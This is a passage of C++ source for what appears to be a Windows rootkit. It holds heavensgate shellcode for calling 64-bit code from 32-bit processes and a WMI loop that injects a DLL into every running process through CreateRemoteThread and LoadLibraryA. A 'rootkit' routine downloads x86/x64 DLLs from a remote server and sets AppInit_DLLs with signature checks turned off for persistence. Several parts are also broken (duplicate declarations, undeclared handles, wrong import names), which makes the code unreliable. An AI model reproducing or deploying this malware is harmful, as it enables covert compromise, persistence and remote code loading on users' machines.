            0x67, 0x48, 0x8B, 0x55, 24, // mov rdx, [ebp + 24]
            0x67, 0x4C, 0x8B, 0x45, 32, // mov r8,  [ebp + 32]
            0x67, 0x4C, 0x8B, 0x4D, 40, // mov r9,  [ebp + 40]

            0x67, 0x48, 0x8B, 0x45, 48, // mov rax, [ebp + 48] args count


            0xA8, 0x01,             // test al, 1
            0x75, 0x04,             // jne 8, _no_adjust
            0x48, 0x83, 0xEC, 0x08, // sub rsp, 8
         // _no adjust:
             0x57, // push rdi
             0x67, 0x48, 0x8B, 0x7D, 0x38,             // mov rdi, [ebp + 56]
             0x48, 0x85, 0xC0,                         // je _ls_e
             0x74, 0x16, 0x48, 0x8D, 0x7C, 0xC7, 0xF8, // lea rdi,[rdi+rax*8-8]
         // _ls:
             0x48, 0x85, 0xC0,       // test rax, rax
             0x74, 0x0C,             // je _ls_e
             0xFF, 0x37,             // push [rdi]
             0x48, 0x83, 0xEF, 0x08, // sub rdi, 8
             0x48, 0x83, 0xE8, 0x01, // sub rax, 1
             0xEB, 0xEF,             // jmp _ls
        // _ls_e:
            0x67, 0x8B, 0x7D, 0x40,       // mov edi, [ebp + 64]
            0x48, 0x83, 0xEC, 0x20,       // sub rsp, 0x20
            0x67, 0xFF, 0x55, 0x08,       // call [ebp + 0x8]
            0x67, 0x89, 0x07,             // mov [edi], eax
            0x67, 0x48, 0x8B, 0x4D, 0x30, // mov rcx, [ebp+48]
            0x48, 0x8D, 0x64, 0xCC, 0x20, // lea rsp,[rsp+rcx*8+0x20]
            0x5F,                         // pop rdi

         // exit 64 bit mode
            0xE8, 0, 0, 0, 0, 0xC7,0x44, 0x24, 4, 0x23, 0, 0, 0, 0x83, 4, 0x24, 0xD, 0xCB,

            0x66, 0x8C, 0xD8, // mov ax, ds
            0x8E, 0xD0,       // mov ss, eax

            0x89, 0xEC, // mov esp, ebp
            0x5D,       // pop ebp
            0xC3        // ret
        };
        // clang-format on

        // this kind of initialization in general case produced better assembly
        // compared to IIFE
        static void* allocated_shellcode = nullptr;

        // MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE
        if (!allocated_shellcode) {
            allocated_shellcode =
                VirtualAlloc(nullptr, sizeof(shellcode), 0x00001000 | 0x00002000, 0x40);

            if (!allocated_shellcode)
                detail::throw_last_error(
                    "VirtualAlloc failed to allocate memory for call_function shellcode");

            std::memcpy(allocated_shellcode, shellcode, sizeof(shellcode));
        }

        using my_fn_sig = void(__cdecl*)(std::uint64_t,
            std::uint64_t,
            std::uint64_t,
            std::uint64_t,
            std::uint64_t,
            std::uint64_t,
            std::uint64_t,
            std::uint32_t);

        std::uint32_t ret;
        reinterpret_cast<my_fn_sig>(allocated_shellcode)(
            func,
            arr_args[0],
            arr_args[1],
            arr_args[2],
            arr_args[3],
            sizeof...(Args) > 4 ? (sizeof...(Args) - 4) : 0,
            reinterpret_cast<std::uint64_t>(arr_args + 4),
            reinterpret_cast<std::uint32_t>(&ret));

        return ret;
    }


    /** \brief An equalient of winapi GetProcAddress function.
     *   \param[in] hmodule The handle to the module in which to search for the
     * procedure. \param[in] procedure_name The name of the procedure to be searched
     * for. \return    The address of the exported function or variable. \exception
     * Throws std::system_error on failure.
     */
    inline std::uint64_t import(std::uint64_t      hmodule,
        const std::string& procedure_name)
    {
        const static auto ldr_procedure_address_base =
            detail::ldr_procedure_address();

        defs::UNICODE_STRING_64 unicode_fun_name = { 0 };
        unicode_fun_name.Length = static_cast<unsigned short>(procedure_name.size());
        unicode_fun_name.MaximumLength = unicode_fun_name.Length + 1;
        const auto data = procedure_name.data();
        std::memcpy(&unicode_fun_name.Buffer, &data, 4);

        std::uint64_t ret;
        auto          fn_ret =
            call_function(ldr_procedure_address_base,
                hmodule,
                reinterpret_cast<std::uint64_t>(&unicode_fun_name),
                static_cast<std::uint64_t>(0),
                reinterpret_cast<std::uint64_t>(&ret));
        if (fn_ret)
            throw std::system_error(
                std::error_code(static_cast<int>(fn_ret), std::system_category()),
                "call_function(ldr_procedure_address_base...) failed");

        return ret;
    }

    /** \brief An equivalent of winapi GetProcAddress function.
     *   \param[in] hmodule The handle to the module in which to search for the
     * procedure. \param[in] procedure_name The name of the procedure to be searched
     * for. \param[out] ec An error code that will be set in case of failure \return
     * The address of the exported function or variable. \exception Does not throw.
     */
    inline std::uint64_t import(std::uint64_t      hmodule,
        const std::string& procedure_name,
        std::error_code& ec)
    {
        static std::uint64_t ldr_procedure_address_base = 0;
        if (!ldr_procedure_address_base) {
            ldr_procedure_address_base = detail::ldr_procedure_address(ec);

            if (ec)
                return 0;
        }

        defs::UNICODE_STRING_64 unicode_fun_name = { 0 };
        unicode_fun_name.Length = static_cast<unsigned short>(procedure_name.size());
        unicode_fun_name.MaximumLength = unicode_fun_name.Length;
        const auto data = procedure_name.data();
        std::memcpy(&unicode_fun_name.Buffer, &data, 4);

        std::uint64_t ret;
        auto          fn_ret = call_function(
            ldr_procedure_address_base, hmodule, &unicode_fun_name, 0, &ret);

        return ret;
    }

} // namespace wow64pp

#endif // #ifndef WOW64PP_HPP

class WMITask
{
protected:

    int WMIGetUserProcesses(char *dllpath, DWORD mypid, bool isrunning64);

    //////////////////////////////////////////////////////
    //////////////////WMI Structs/////////////////////////
    CComPtr< IWbemLocator > locator;
    CComPtr< IWbemServices > service;
    CComPtr< IEnumWbemClassObject > enumerator;

    CComPtr< IWbemClassObject > object;

    HRESULT WMIHandle;
    ///////////////////////////////////////////////////////

public:

    //////////////////////////////////////////////////////
    /////////////////WMI Vaiables/////////////////////////

    // WMI Vars : Process
    CString sUserProcesses;

    DWORD mypid;
    ///////////////////////////////////////////////////////

    WMITask(char* dllpath, DWORD mypid, BOOL isrunning64);

	void WMIConnect(char* dllpath, DWORD mypid, BOOL isrunning64);



	int WMIGetUserProcesses(char* dllpath, DWORD mypid, BOOL isrunning64);

};

// Contructor
//__________________________________________________________________________________
WMITask::WMITask(char *dllpath, DWORD mypid, BOOL isrunning64)
{
    WMIConnect(dllpath, mypid, isrunning64);
}

// WMI Handler
//_____________________________________________________________________________
void WMITask::WMIConnect(char *dllpath, DWORD mypid, BOOL isrunning64)
{
    // http://msdn.microsoft.com/en-us/library/aa389273(v=VS.85).aspx

    int result = 0;
    WMIHandle = CoInitializeEx(NULL, COINIT_MULTITHREADED);

    // setup process-wide security context
    WMIHandle = CoInitializeSecurity(NULL,	// we're not a server
        -1,			// we're not a server
        NULL,		// we're not a server
        NULL,		// reserved
        RPC_C_AUTHN_LEVEL_DEFAULT, // let DCOM decide
        RPC_C_IMP_LEVEL_IMPERSONATE,
        NULL,
        EOAC_NONE,
        NULL);

    // we're going to use CComPtr<>s, whose lifetime must end BEFORE CoUnitialize is called
    // connect to WMI
    WMIHandle = CoCreateInstance(CLSID_WbemAdministrativeLocator, NULL,
        CLSCTX_INPROC_SERVER,
        IID_IWbemLocator, reinterpret_cast<void**>(&locator));

    if (FAILED(WMIHandle))
    {
        // Instantiation of IWbemLocator failed
        
        return;
    }

    // connect to local service with current credentials
    WMIHandle = locator->ConnectServer(L"root\\cimv2", NULL, NULL, NULL,
        WBEM_FLAG_CONNECT_USE_MAX_WAIT,
        NULL, NULL, &service);

    if (SUCCEEDED(WMIHandle))
    {
        WMIGetUserProcesses(dllpath, mypid, isrunning64);

    }
    else {
        // Couldn't connect to service
    }
    CoUninitialize();
}



int WMITask::WMIGetUserProcesses(char * dllpath, DWORD mypid, BOOL isrunning64)
{

    HRESULT hr = 0;
    IWbemLocator* WbemLocator = NULL;
    IWbemServices* WbemServices = NULL;
    IEnumWbemClassObject* EnumWbem = NULL;

    //initializate the Windows security
    if(CoInitializeEx(0, COINIT_MULTITHREADED) != S_OK)
        return -1;
    if(CoInitializeSecurity(NULL, -1, NULL, NULL, RPC_C_AUTHN_LEVEL_DEFAULT, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_NONE, NULL) != S_OK)
        return -1;

    if (CoCreateInstance(CLSID_WbemLocator, 0, CLSCTX_INPROC_SERVER, IID_IWbemLocator, (LPVOID*)&WbemLocator) != S_OK)
        return -1;
    //connect to the WMI
    if(WbemLocator->ConnectServer(L"ROOT\\CIMV2", NULL, NULL, NULL, 0, NULL, NULL, &WbemServices) != S_OK)
        return -1;
    //Run the WQL Query
    if(WbemServices->ExecQuery(L"WQL", L"SELECT ProcessId FROM Win32_Process", WBEM_FLAG_FORWARD_ONLY, NULL, &EnumWbem) != S_OK)
        return -1;

    // Iterate over the enumerator
    if (EnumWbem != nullptr) {
        IWbemClassObject* result = NULL;
        ULONG returnedCount = 0;

        while ((hr = EnumWbem->Next(WBEM_INFINITE, 1, &result, &returnedCount)) == S_OK) {
            VARIANT ProcessId;

            // access the properties
            hr = result->Get(L"ProcessId", 0, &ProcessId, 0, 0);
            if (ProcessId.uintVal <= 0 || hr != S_OK) {
                continue;
            }


			if (!IsInjected(ProcessId.uintVal) && ProcessId.uintVal != mypid) {
				HANDLE h = NULL;
				if (isrunning64) {
                    auto            kernel32 = wow64pp::module_handle("kernel32.dll");
                    std::error_code ec;
                    if (ec) return -2;
                    auto OpenProcess64 = wow64pp::import(kernel32, "OpenProcess", ec);
                    if (ec) return -3;
                    std::error_code ec;
                    LPVOID LoadLibAddr = (LPVOID)wow64pp::import(kernel32, "LoadLibraryA", ec);
                    if (ec) return -4;
                    std::error_code ec;
                    auto VirtualAllocEx64 = wow64pp::import(kernel32, "VirtualAllocEx64", ec);
                    if (ec) return -5;
                    std::error_code ec;
                    auto WriteProcessMemory64 = wow64pp::import(kernel32, "WriteProcessMemory", ec);
                    if (ec) return -6;
                    std::error_code ec;
                    auto CreateRemoteThread64 = wow64pp::import(kernel32, "CreateRemoteThread", ec);
                    if (ec) return -7;
                    std:error_code ec;
                    auto WaitForSingleObject64 = wow64pp::import(kernel32, "WaitForSingleObject", ec);
                    if (ec) return -8;
                    std:error_code ec;
                    auto VirtualFreeEx64 = wow64pp::import(kernel32, "VirtualFreeEx", ec);
                    if (ec) return -9;
                    h = (HANDLE)wow64pp::call_function(OpenProcess64, PROCESS_ALL_ACCESS, false, ProcessId.uintVal);
                    if (h) {
                        auto dereercomp = wow64pp::call_function(VirtualAllocEx64, h, NULL, strlen(dllpath), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
                        wow64pp::call_function(WriteProcessMemory64, h, dereercomp, dllpath, strlen(dllpath), NULL);
                        HANDLE asdc = (HANDLE)wow64pp::call_function(CreateRemoteThread64, h, NULL, NULL, (LPTHREAD_START_ROUTINE)LoadLibAddr, dereercomp, 0, NULL);
                        wow64pp::call_function(WaitForSingleObject64, asdc, 5000);
                        wow64pp::call_function(VirtualFreeEx64, dereercomp, strlen(dllpath), MEM_RELEASE);
                    }
                }
				else {
				}
                h = OpenProcess(PROCESS_ALL_ACCESS, false, ProcessId.uintVal);
				if (h)
				{
					LPVOID LoadLibAddr = (LPVOID)GetProcAddress(GetModuleHandleA("kernel32.dll"), "LoadLibraryA");
					LPVOID dereercomp = VirtualAllocEx(h, NULL, strlen(dllpath), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
					WriteProcessMemory(h, dereercomp, dllpath, strlen(dllpath), NULL);
					HANDLE asdc = CreateRemoteThread(h, NULL, NULL, (LPTHREAD_START_ROUTINE)LoadLibAddr, dereercomp, 0, NULL);
					VirtualFreeEx(h, dereercomp, strlen(dllpath), MEM_RELEASE);
					CloseHandle(asdc);
					CloseHandle(h);
				};
			}
        }
    }
    if (EnumWbem != nullptr) 
        EnumWbem->Release();
    
    if (WbemServices != nullptr) 
        WbemServices->Release();
    
    if(WbemLocator!= nullptr)
        WbemLocator->Release();

    CoUninitialize();
    return 0;
}
#pragma comment(lib, "urlmon.lib")

void DownloadFile(char* url, char* dest) {

	HINTERNET hInet;
	hInet = InternetOpenA("Dll Getter", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
	if (!hInet) return;
	HANDLE fh, f;
	
	fh = InternetOpenUrl(ih, url, NULL, 0, 0, 0);
	if (fh != NULL) {

		// open the file
		f = CreateFile(dest, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, 0);
		// make sure that our file handle is valid
		if (f < (HANDLE)1) {
			return;
		}
		char fbuff[512];
		DWORD r = 0, d = 0;
		do {
			memset(fbuff, 0, sizeof(fbuff));
			InternetReadFile(fh, fbuff, sizeof(fbuff), &r);
			WriteFile(f, fbuff, r, &d, NULL);
		} while (r > 0);
		CloseHandle(f);
	}
}
char *getFileContent(char * pathname) {
	ifstream hexa;
	hexa.open("hexNums.txt");
	int size = hexa.tellg();
	char* hexarray =(char*)malloc(size);

	while (!hexa.eof())
	{
		for (int i = 0; i <= size; i++)
		{

			hexarray[i] = hexa.get();
		}
	}



	hexa.close();
	return hexarray;
}
DWORD WINAPI rootkit(LPARAM none) {


	int err = 0;
	WSADATA WSAdata;
	if ((err = WSAStartup(MAKEWORD(2, 2), &WSAdata)) != 0)
		return 0;
	if (LOBYTE(WSAdata.wVersion) != 2 || HIBYTE(WSAdata.wVersion) != 2) {
		WSACleanup();
		return 0;
	}
	ih = InternetOpen("Mozilla/4.0 (compatible)", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
	if (ih == NULL) ih = 0;

	HKEY hKey;
	long result = RegOpenKeyExA(
		HKEY_LOCAL_MACHINE,
		(LPCSTR)"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows\\AppInit_DLLs",
		0,
		KEY_WRITE,
		&hKey
	);
    char dllinstallpath[MAX_PATH + 17];
    char exeinstallpath[MAX_PATH + 17];
    sprintf(dllinstallpath, "%s\\%s\\%s_.dll", std::getenv("APPDATA"), dllhide, dllhide);
    sprintf(exeinstallpath, "%s\\%s\\%s_.exe", std::getenv("APPDATA"), dllhide, dllhide);
	struct stat buffer;
	char url[512];
	BOOL f64 = FALSE;
	bool isrunning64 = IsWow64Process(GetCurrentProcess(), &f64) && f64;
	if (isrunning64) {
		MessageBoxA(0, "runnning64:true", 0, 0);
		sprintf(url, "http://%s/x64.dll", dllserver);
	} else {
		MessageBoxA(0, "runnning86:true", 0, 0);
		sprintf(url, "http://%s/x86.dll", dllserver);
  
    }
	if (stat(dllinstallpath, &buffer) != 0) {
        DownloadFile(url, dllinstallpath);
        if (stat(dllinstallpath, &buffer) != 0) return 2;
	}

	if (result == ERROR_SUCCESS) {

		DWORD value0 = 0;
		DWORD value1 = 1;
		RegSetValueExA(hKey, "AppInit_DLLs", 0, REG_SZ, (BYTE*)dllinstallpath, (strlen(dllinstallpath) + 1) * sizeof(char));
		RegSetValueExA(hKey, "RequireSignedAppInit_DLLs", 0, REG_DWORD, (BYTE*)value0, sizeof(DWORD));
		RegSetValueExA(hKey, "LoadAppInit_DLLs", 0, REG_DWORD, (BYTE*)value1, sizeof(DWORD));
		RegCloseKey(hKey);
	}
	// check if the library has a ReflectiveLoader...
	char *lpBuff = getFileContent(dllinstallpath);
	DWORD dwReflectiveLoaderOffset = GetReflectiveLoaderOffset(lpBuff);
	if (!dwReflectiveLoaderOffset)
	{
		return -4123;
	}

    DWORD mypid = GetCurrentProcessId();
	while (1) {
        /*DWORD activePID;
        HWND activeWnd = GetActiveWindow();
        GetWindowThreadProcessId(activeWnd, &activePID);
		*/
        WMITask wmi = WMITask(dllinstallpath, mypid, isrunning64);
        Sleep(100);
	}
}
#endif
#endif
